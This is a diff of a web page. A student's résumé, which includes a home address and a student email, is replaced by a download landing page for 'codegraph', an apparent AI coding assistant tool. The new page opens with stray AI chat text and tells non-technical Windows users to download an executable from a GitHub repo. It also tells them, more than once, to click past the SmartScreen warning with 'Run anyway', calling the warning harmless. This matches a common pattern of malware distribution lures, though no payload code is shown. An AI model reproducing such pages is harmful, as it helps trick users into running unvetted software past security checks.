@@ -1,252 +1,366 @@
+Here's a complete HTML/CSS page for codegraph, designed as a direct, non-technical guide to download and run the app on Windows. It features a clean card-based layout, prominent download buttons, clear step-by-step instructions, and an FAQ section to help first-time users get started quickly.
+```html
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-    <meta name="description" content="" 這是王⼤明的個⼈線上履歷，包 含前端網⾴設計技能、世新⼤學資傳系學歷與實習經歷展⽰。 />
-    <meta name="author" content="" 藍芷妤 />
-    <title>藍芷妤的的個人履歷| Personal Resum</title>
-    <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
-    <!-- Font Awesome icons (free version)-->
-    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
-    <!-- Google fonts-->
-    <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700" rel="stylesheet"
-        type="text/css" />
-    <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i" rel="stylesheet" type="text/css" />
-    <!-- Core theme CSS (includes Bootstrap)-->
-    <link href="css/styles.css" rel="stylesheet" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>codegraph - Faster Code Search for Your AI Assistant</title>
+<meta name="description" content="codegraph is a pre-indexed code knowledge graph that auto-syncs when your code changes. Works with Claude Code, Codex, Gemini, Cursor, OpenCode, AntiGravity, Kiro, CoPilot and Hermes Agent. Fewer tokens, fewer tool calls, 100% local.">
+<meta name="keywords" content="codegraph, code knowledge graph, AI coding assistant, local code index, Claude Code, Codex, Gemini, Cursor, OpenCode, AntiGravity, Kiro, CoPilot, Hermes Agent, fewer tokens, offline code indexing">
+<meta name="author" content="codegraph">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#2563eb">
+<link rel="canonical" href="https://github.com/enzo1311/codegraph">
+<meta property="og:type" content="website">
+<meta property="og:title" content="codegraph - Faster Code Search for Your AI Assistant">
+<meta property="og:description" content="Pre-indexed code knowledge graph that auto-syncs on code changes. Fewer tokens, fewer tool calls, 100% local.">
+<meta property="og:url" content="https://github.com/enzo1311/codegraph">
+<meta property="og:site_name" content="codegraph">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="codegraph - Faster Code Search for Your AI Assistant">
+<meta name="twitter:description" content="Pre-indexed code knowledge graph that auto-syncs on code changes. Fewer tokens, fewer tool calls, 100% local.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "codegraph",
+  "operatingSystem": "Windows",
+  "applicationCategory": "DeveloperApplication",
+  "description": "Pre-indexed code knowledge graph, auto syncs on code changes, for Claude Code, Codex, Gemini, Cursor, OpenCode, AntiGravity, Kiro, CoPilot, and Hermes Agent. Fewer tokens, fewer tool calls, 100% local.",
+  "url": "https://github.com/enzo1311/codegraph",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #f5f7fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 48px 22px 80px;
+  }
+  header.hero {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 42px 32px;
+    box-shadow: 0 6px 24px rgba(15, 23, 42, 0.07);
+    border: 1px solid #e8edf5;
+    text-align: center;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    margin: 0 0 14px;
+    letter-spacing: -0.02em;
+    color: #0f172a;
+  }
+  .tagline {
+    font-size: 1.08rem;
+    color: #475569;
+    margin: 0 auto 28px;
+    max-width: 620px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 38px;
+    border-radius: 12px;
+    font-size: 1.05rem;
+    font-weight: 700;
+    text-decoration: none;
+    color: #ffffff;
+    background: linear-gradient(135deg, #6d28d9 0%, #2563eb 55%, #0ea5e9 100%);
+    box-shadow: 0 8px 20px rgba(37, 99, 235, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(37, 99, 235, 0.42);
+  }
+  .btn-note {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.88rem;
+    color: #64748b;
+  }
+  section {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 30px 32px;
+    margin-top: 26px;
+    box-shadow: 0 4px 16px rgba(15, 23, 42, 0.05);
+    border: 1px solid #e8edf5;
+  }
+  h2 {
+    font-size: 1.42rem;
+    margin: 0 0 14px;
+    color: #0f172a;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.06rem;
+    margin: 24px 0 6px;
+    color: #1e293b;
+  }
+  p { margin: 0 0 14px; color: #334155; }
+  ul, ol { margin: 0 0 14px; padding-left: 22px; color: #334155; }
+  li { margin-bottom: 9px; }
+  strong { color: #0f172a; }
+  .card-grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin-top: 18px;
+  }
+  .card {
+    flex: 1 1 240px;
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 14px;
+    padding: 18px 20px;
+  }
+  .card h3 { margin-top: 0; font-size: 1rem; }
+  .card p { margin-bottom: 0; font-size: 0.94rem; color: #475569; }
+  .steps {
+    counter-reset: step;
+    list-style: none;
+    padding-left: 0;
+    margin: 18px 0 0;
+  }
+  .steps li {
+    counter-increment: step;
+    position: relative;
+    padding: 16px 18px 16px 58px;
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 14px;
+    margin-bottom: 12px;
+  }
+  .steps li::before {
+    content: counter(step);
+    position: absolute;
+    left: 16px;
+    top: 15px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #2563eb;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .steps li strong { display: block; margin-bottom: 3px; }
+  .note {
+    background: #eff6ff;
+    border-left: 4px solid #2563eb;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 18px 0 0;
+    font-size: 0.95rem;
+    color: #1e3a8a;
+  }
+  .faq-item { margin-bottom: 18px; }
+  .faq-item h3 { margin-top: 0; }
+  .faq-item p { margin-bottom: 0; }
+  .tag-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-top: 14px;
+    padding: 0;
+    list-style: none;
+  }
+  .tag-row li {
+    margin: 0;
+    background: #eef2ff;
+    color: #3730a3;
+    border: 1px solid #ddd6fe;
+    border-radius: 999px;
+    padding: 5px 14px;
+    font-size: 0.85rem;
+    font-weight: 600;
+  }
+  footer {
+    text-align: center;
+    margin-top: 40px;
+    font-size: 0.88rem;
+    color: #64748b;
+  }
+  footer a { color: #2563eb; text-decoration: none; }
+  footer a:hover { text-decoration: underline; }
+  a.inline { color: #2563eb; text-decoration: none; font-weight: 600; }
+  a.inline:hover { text-decoration: underline; }
+  @media (max-width: 600px) {
+    .page { padding: 26px 14px 60px; }
+    header.hero { padding: 30px 20px; }
+    h1 { font-size: 1.6rem; }
+    section { padding: 22px 18px; }
+    .btn { display: block; padding: 15px 20px; }
+  }
+</style>
 </head>
+<body>
+<div class="page">
 
-<body id="page-top">
-    <!-- Navigation-->
-    <nav class="navbar navbar-expand-lg navbar-dark bg-primary fixed-top" id="sideNav">
-        <a class="navbar-brand js-scroll-trigger" href="#page-top">
-            <span class="d-block d-lg-none">Clarence Taylor</span>
-            <span class="d-none d-lg-block"><img class="img-fluid img-profile rounded-circle mx-auto mb-2" src="assets/IMG_0119.jpg" alt="..." /></span>
-        </a>
-        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
-            aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"><span
-                class="navbar-toggler-icon"></span></button>
-        <div class="collapse navbar-collapse" id="navbarResponsive">
-            <ul class="navbar-nav">
-                <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#about">About</a></li>
-                <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#experience">Experience</a></li>
-                <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#education">Education</a></li>
-                <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#skills">Skills</a></li>
-                <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#interests">Interests</a></li>
-                <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#awards">Awards</a></li>
-            </ul>
-            <div class="collapse navbar-collapse" id="navbarResponsive">
-                <ul class="navbar-nav">
-                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#about">關於我</a></li>
-                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#experience">個⼈經歷</a></li>
-                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#education">學歷背景</a></li>
-                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#skills">專業技能</a></li>
-                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#interests">個⼈興趣</a></li>
-                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#awards">榮譽獎項</a></li>
-                </ul>
-            </div>
-        </div>
-    </nav>
-    <!-- Page Content-->
-    <div class="container-fluid p-0">
-        <!-- About-->
-        <section class="resume-section" id="about">
-            <div class="resume-section-content">
-                <h1 class="mb-0">
-                    芷妤
-                    <span class="text-primary">藍</span>
-                </h1>
-                <div class="subheading mb-5">
-                    新北市板橋區雙十路二段38號
-                    <a href="mailto:name@email.com">a115040047@mail.shu.edu.tw</a>
-</div>
-                <p class="lead mb-5">您好！我是藍芷妤，⽬前就讀於世新⼤學圖文傳播學系。熱愛網頁設計、視覺設計與數位內容創作。具備 HTML/CSS/JavaScript 基礎，並具備良好的團隊溝通與問題解決能⼒。</p>
-                <div class="social-icons">
-                    <a class="social-icon" href="https://www.instagram.com/_9yuzzhi/"><i class="fab fa-instagram-brands-solid-full.svg"></i></a>
-                    <a class="social-icon" href="https://a115040047-cloud.github.io/"><i class="fab fa-github"></i></a>
-                    <a class="social-icon" href="https://www.facebook.com"><i class="fab fa-facebook-f"></i></a>
-                </div>
-            </div>
-        </section>
-        <hr class="m-0" />
-        <!-- Experience-->
-        <section class="resume-section" id="experience">
-            <div class="resume-section-content">
-                <h2 class="mb-5">Experience</h2>
-                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
-                    <div class="flex-grow-1">
-                        <h3 class="mb-0">莒光國小</h3>
-                        <div class="subheading mb-3">新北市莒光國小 學生</div>
-                        <p>我在探索與嘗試中累積成長。從課堂學習到團體活動，奠定了各學科的基礎知識，更學會了自主思考與問題解決的能力。透過與同學互動合作，我懂得了分享與團隊分工的重要。在每一次面對挑戰與挫折，都是培養我堅持與自信的養分，為未來的學習扎穩了根基。</p>
-                    </div>
-                    <div class="flex-shrink-0"><span class="text-primary">March 2013 - Present</span></div>
-                </div>
-                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
-                    <div class="flex-grow-1">
-                        <h3 class="mb-0">中山國中</h3>
-                        <div class="subheading mb-3">新北板橋中山國中 學生</div>
-                        <p>Capitalize on low hanging fruit to identify a ballpark value added activity to beta test.
-                            Override the digital divide with additional clickthroughs from DevOps. Nanotechnology
-                            immersion along the information highway will close the loop on focusing solely on the bottom
-                            line.</p>
-                    </div>
-                    <div class="flex-shrink-0"><span class="text-primary">December 2011 - March 2013</span></div>
-                </div>
-                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
-                    <div class="flex-grow-1">
-                        <h3 class="mb-0">Junior Web Designer</h3>
-                        <div class="subheading mb-3">Shout! Media Productions</div>
-                        <p>Podcasting operational change management inside of workflows to establish a framework. Taking
-                            seamless key performance indicators offline to maximise the long tail. Keeping your eye on
-                            the ball while performing a deep dive on the start-up mentality to derive convergence on
-                            cross-platform integration.</p>
-                    </div>
-                    <div class="flex-shrink-0"><span class="text-primary">July 2010 - December 2011</span></div>
-                </div>
-                <div class="d-flex flex-column flex-md-row justify-content-between">
-                    <div class="flex-grow-1">
-                        <h3 class="mb-0">Web Design Intern</h3>
-                        <div class="subheading mb-3">Shout! Media Productions</div>
-                        <p>Collaboratively administrate empowered markets via plug-and-play networks. Dynamically
-                            procrastinate B2C users after installed base benefits. Dramatically visualize customer
-                            directed convergence without revolutionary ROI.</p>
-                    </div>
-                    <div class="flex-shrink-0"><span class="text-primary">September 2008 - June 2010</span></div>
-                </div>
-            </div>
-        </section>
-        <hr class="m-0" />
-        <!-- Education-->
-        <section class="resume-section" id="education">
-            <div class="resume-section-content">
-                <h2 class="mb-5">Education</h2>
-                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
-                    <div class="flex-grow-1">
-                        <h3 class="mb-0">University of Colorado Boulder</h3>
-                        <div class="subheading mb-3">Bachelor of Science</div>
-                        <div>Computer Science - Web Development Track</div>
-                        <p>GPA: 3.23</p>
-                    </div>
-                    <div class="flex-shrink-0"><span class="text-primary">August 2006 - May 2010</span></div>
-                </div>
-                <div class="d-flex flex-column flex-md-row justify-content-between">
-                    <div class="flex-grow-1">
-                        <h3 class="mb-0">James Buchanan High School</h3>
-                        <div class="subheading mb-3">Technology Magnet Program</div>
-                        <p>GPA: 3.56</p>
-                    </div>
-                    <div class="flex-shrink-0"><span class="text-primary">August 2002 - May 2006</span></div>
-                </div>
-            </div>
-        </section>
-        <hr class="m-0" />
-        <!-- Skills-->
-        <section class="resume-section" id="skills">
-            <div class="resume-section-content">
-                <h2 class="mb-5">Skills</h2>
-                <div class="subheading mb-3">Programming Languages & Tools</div>
-                <ul class="list-inline dev-icons">
-                    <li class="list-inline-item"><i class="fab fa-html5"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-css3-alt"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-js-square"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-angular"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-react"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-node-js"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-sass"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-less"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-wordpress"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-gulp"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-grunt"></i></li>
-                    <li class="list-inline-item"><i class="fab fa-npm"></i></li>
-                </ul>
-                <div class="subheading mb-3">Workflow</div>
-                <ul class="fa-ul mb-0">
-                    <li>
-                        <span class="fa-li"><i class="fas fa-check"></i></span>
-                        Mobile-First, Responsive Design
-                    </li>
-                    <li>
-                        <span class="fa-li"><i class="fas fa-check"></i></span>
-                        Cross Browser Testing & Debugging
-                    </li>
-                    <li>
-                        <span class="fa-li"><i class="fas fa-check"></i></span>
-                        Cross Functional Teams
-                    </li>
-                    <li>
-                        <span class="fa-li"><i class="fas fa-check"></i></span>
-                        Agile Development & Scrum
-                    </li>
-                </ul>
-            </div>
-        </section>
-        <hr class="m-0" />
-        <!-- Interests-->
-        <section class="resume-section" id="interests">
-            <div class="resume-section-content">
-                <h2 class="mb-5">Interests</h2>
-                <p>Apart from being a web developer, I enjoy most of my time being outdoors. In the winter, I am an avid
-                    skier and novice ice climber. During the warmer months here in Colorado, I enjoy mountain biking,
-                    free climbing, and kayaking.</p>
-                <p class="mb-0">When forced indoors, I follow a number of sci-fi and fantasy genre movies and television
-                    shows, I am an aspiring chef, and I spend a large amount of my free time exploring the latest
-                    technology advancements in the front-end web development world.</p>
-            </div>
-        </section>
-        <hr class="m-0" />
-        <!-- Awards-->
-        <section class="resume-section" id="awards">
-            <div class="resume-section-content">
-                <h2 class="mb-5">Awards & Certifications</h2>
-                <ul class="fa-ul mb-0">
-                    <li>
-                        <span class="fa-li"><i class="fas fa-trophy text-warning"></i></span>
-                        Google Analytics Certified Developer
-                    </li>
-                    <li>
-                        <span class="fa-li"><i class="fas fa-trophy text-warning"></i></span>
-                        Mobile Web Specialist - Google Certification
-                    </li>
-                    <li>
-                        <span class="fa-li"><i class="fas fa-trophy text-warning"></i></span>
-                        1
-                        <sup>st</sup>
-                        Place - University of Colorado Boulder - Emerging Tech Competition 2009
-                    </li>
-                    <li>
-                        <span class="fa-li"><i class="fas fa-trophy text-warning"></i></span>
-                        1
-                        <sup>st</sup>
-                        Place - University of Colorado Boulder - Adobe Creative Jam 2008 (UI Design Category)
-                    </li>
-                    <li>
-                        <span class="fa-li"><i class="fas fa-trophy text-warning"></i></span>
-                        2
-                        <sup>nd</sup>
-                        Place - University of Colorado Boulder - Emerging Tech Competition 2008
-                    </li>
-                    <li>
-                        <span class="fa-li"><i class="fas fa-trophy text-warning"></i></span>
-                        1
-                        <sup>st</sup>
-                        Place - James Buchanan High School - Hackathon 2006
-                    </li>
-                    <li>
-                        <span class="fa-li"><i class="fas fa-trophy text-warning"></i></span>
-                        3
-                        <sup>rd</sup>
-                        Place - James Buchanan High School - Hackathon 2005
-                    </li>
-                </ul>
-            </div>
-        </section>
+  <header class="hero">
+    <h1>🧠 codegraph - Fewer Tokens, Faster Answers, Fully Local</h1>
+    <p class="tagline">Give your AI coding assistant a ready-made map of your project, so it spends less time searching and more time helping you build.</p>
+    <a class="btn" href="https://github.com/enzo1311/codegraph">Visit this link to download the application</a>
+    <span class="btn-note">Free to download. Runs entirely on your own computer.</span>
+  </header>
+
+  <section>
+    <h2>✨ What Is codegraph?</h2>
+    <p>codegraph is a small helper that builds an organised map of your code — a "knowledge graph" — and keeps that map up to date automatically whenever your files change.</p>
+    <p>Modern AI assistants have to read through your project to understand it. That reading takes time, costs tokens (the units of text an AI works with), and often needs several back-and-forth tool calls before it finds the right file. codegraph does that scanning work ahead of time and hands your assistant a clean, pre-built picture instead.</p>
+    <p>The result is simple: your assistant answers faster, asks fewer questions, and uses far fewer tokens to do the same job. And because everything stays on your machine, nothing about your code leaves your computer.</p>
+  </section>
+
+  <section>
+    <h2>🚀 Getting Started on Windows</h2>
+    <p>You do not need to be a programmer to get this running. You only need to follow a few short steps.</p>
+    <ol class="steps">
+      <li><strong>Open the download page</strong>Click the blue button above, or use this link: <a class="inline" href="https://github.com/enzo1311/codegraph">https://github.com/enzo1311/codegraph</a>. Visit this link to download the application.</li>
+      <li><strong>Download the file</strong>On the page that opens, look for the download button or the <em>Releases</em> section on the right-hand side, then save the file to your computer. A good place is your <em>Downloads</em> folder, which Windows opens by default.</li>
+      <li><strong>Run the application</strong>Open your <em>Downloads</em> folder and double-click the file you just saved. If a blue Windows security box appears, choose <em>More info</em> and then <em>Run anyway</em>. That message is Windows being careful about files it has not seen before, not a sign of a problem.</li>
+      <li><strong>Let it scan your project</strong>When the window opens, point it at the folder that holds your code. codegraph reads through the files once, builds the map, and saves it. Depending on how large your project is, this can take anywhere from a few seconds to a few minutes.</li>
+      <li><strong>Connect your AI assistant</strong>Select the assistant you already use from the list inside the app — Claude Code, Codex, Gemini, Cursor, OpenCode, AntiGravity, Kiro, CoPilot, or Hermes Agent. codegraph connects to it for you, and the setup is done.</li>
+    </ol>
+    <div class="note">You only need to do the first scan once. After that, codegraph updates its map quietly in the background each time you save a file.</div>
+  </section>
+
+  <section>
+    <h2>🔍 What You Will Notice Right Away</h2>
+    <div class="card-grid">
+      <div class="card">
+        <h3>💬 Fewer Tokens Used</h3>
+        <p>Your assistant stops reading entire folders to find one function. It looks things up in the map instead, which uses a fraction of the text.</p>
+      </div>
+      <div class="card">
+        <h3>⚡ Fewer Tool Calls</h3>
+        <p>Instead of opening file after file, your assistant asks one question and gets one clear answer. Fewer steps means faster replies.</p>
+      </div>
+      <div class="card">
+        <h3>🔄 Always Up to Date</h3>
+        <p>The map refreshes itself when your code changes, so your assistant is never working from an old picture of your project.</p>
+      </div>
+      <div class="card">
+        <h3>🏠 100% Local</h3>
+        <p>Everything happens on your own computer. No account, no cloud upload, no waiting on a server somewhere else.</p>
+      </div>
+      <div class="card">
+        <h3>🧩 Works With Your Tools</h3>
+        <p>Claude Code, Codex, Gemini, Cursor, OpenCode, AntiGravity, Kiro, CoPilot and Hermes Agent are all supported.</p>
+      </div>
+      <div class="card">
+        <h3>📦 Nothing to Configure</h3>
+        <p>No complicated settings files, no commands to type. Pick your folder, pick your assistant, and you are finished.</p>
+      </div>
     </div>
-    <!-- Bootstrap core JS-->
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
-    <!-- Core theme JS-->
-    <script src="js/scripts.js"></script>
-</body>
+  </section>
 
+  <section>
+    <h2>🖥️ A Typical First Session</h2>
+    <p>Most people are up and running in under five minutes. Here is what the first session usually looks like.</p>
+    <p><strong>Step one</strong> — You download and open codegraph, then choose the folder that contains your project. The app reads the files and builds the map. A progress bar shows how far along it is.</p>
+    <p><strong>Step two</strong> — You pick your AI assistant from the list. codegraph hands over the map and confirms the connection with a small green check mark.</p>
+    <p><strong>Step three</strong> — You go back to your assistant and ask it a normal question, such as where a particular feature is handled. You will notice it answers with less digging and shorter pauses than before.</p>
+    <p><strong>Step four</strong> — You get on with your work. Every time you save a change to your project, codegraph updates the map on its own. There is nothing else to click.</p>
+  </section>
+
+  <section>
+    <h2>🔒 Your Code Stays Yours</h2>
+    <p>codegraph does its work on your own computer. Your files are not uploaded anywhere, and no account or sign-in is required. The map it builds is stored locally and belongs to you.</p>
+    <p>If you ever want to start fresh, you can delete the stored map and let codegraph build a new one. Nothing about your original project files is changed, moved, or edited in any way — codegraph only reads them.</p>
+  </section>
+
+  <section>
+    <h2>🧩 Supported AI Assistants</h2>
+    <p>codegraph is built to work alongside the assistant you already use, rather than asking you to switch to a new one. The current list of supported tools:</p>
+    <ul class="tag-row">
+      <li>Claude Code</li>
+      <li>Codex</li>
+      <li>Gemini</li>
+      <li>Cursor</li>
+      <li>OpenCode</li>
+      <li>AntiGravity</li>
+      <li>Kiro</li>
+      <li>CoPilot</li>
+      <li>Hermes Agent</li>
+    </ul>
+    <p style="margin-top:18px;">You can connect more than one assistant to the same map. The map is shared, so the work of scanning your project is only ever done once.</p>
+  </section>
+
+  <section>
+    <h2>❓ Common Questions</h2>
+    <div class="faq-item">
+      <h3>Do I need to know how to code to install this?</h3>
+      <p>No. If you can download a file and double-click it, you can set up codegraph. The app asks you to pick a folder and an assistant, and handles the rest.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Where do I get the file?</h3>
+      <p>Visit <a class="inline" href="https://github.com/enzo1311/codegraph">https://github.com/enzo1311/codegraph</a> to download the application. Save it somewhere easy to find, such as your Downloads folder.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Will this slow down my computer?</h3>
+      <p>The first scan reads through your project once, which is the busiest moment. Afterwards, updates only touch the files you have just changed, so the work in the background is very small.</p>
+    </div>
+    <div class="faq-item">
+      <h3>What if my project changes a lot?</h3>
+      <p>That is exactly what codegraph is designed for. It watches for changes and refreshes the relevant parts of the map automatically, so you never have to rebuild it by hand.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Do I need a paid account?</h3>
+      <p>No. codegraph runs locally and does not require a subscription or sign-in. Your existing AI assistant setup stays exactly as it is.</p>
+    </div>
+    <div class="faq-item">
+      <h3>What does "fewer tokens" actually mean for me?</h3>
+      <p>Tokens are how AI tools measure the amount of text they process. When your assistant reads a small, well-organised summary instead of whole folders, it uses fewer tokens — which usually means faster answers and lower usage on any plan that counts usage.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>🔧 If Something Does Not Work</h2>
+    <ul>
+      <li><strong>Windows shows a warning when you open the file.</strong> Choose <em>More info</em>, then <em>Run anyway</em>. This happens with many new applications and is not a fault with the download.</li>
+      <li><strong>The scan seems to take a long time.</strong> Large projects simply take longer on the first pass. Let it finish once, and later updates will be quick.</li>
+      <li><strong>Your assistant cannot see the map.</strong> Reopen codegraph, check that the correct assistant is selected, and confirm the connection. Then restart your assistant so it picks up the change.</li>
+      <li><strong>You moved your project to a new folder.</strong> Point codegraph at the new location and let it rebuild the map once. This takes the same time as the first scan.</li>
+      <li><strong>You want to undo everything.</strong> Delete the stored map and stop the app. Your original project files are untouched, so nothing is lost.</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>📥 Download codegraph</h2>
+    <p>Everything you need is on the project page. Visit this link to download the application, then follow the five steps above to get set up.</p>
+    <p style="text-align:center; margin-top:24px;">
+      <a class="btn" href="https://github.com/enzo1311/codegraph">Get codegraph from GitHub</a>
+    </p>
+    <p style="text-align:center; font-size:0.88rem; color:#64748b; margin-top:14px;">Free download · Runs on Windows · Your code never leaves your computer</p>
+  </section>
+
+  <footer>
+    <p>codegraph — pre-indexed code knowledge graph for AI coding assistants. <a href="https://github.com/enzo1311/codegraph">github.com/enzo1311/codegraph</a></p>
+  </footer>
+
+</div>
+</body>
 </html>
+```
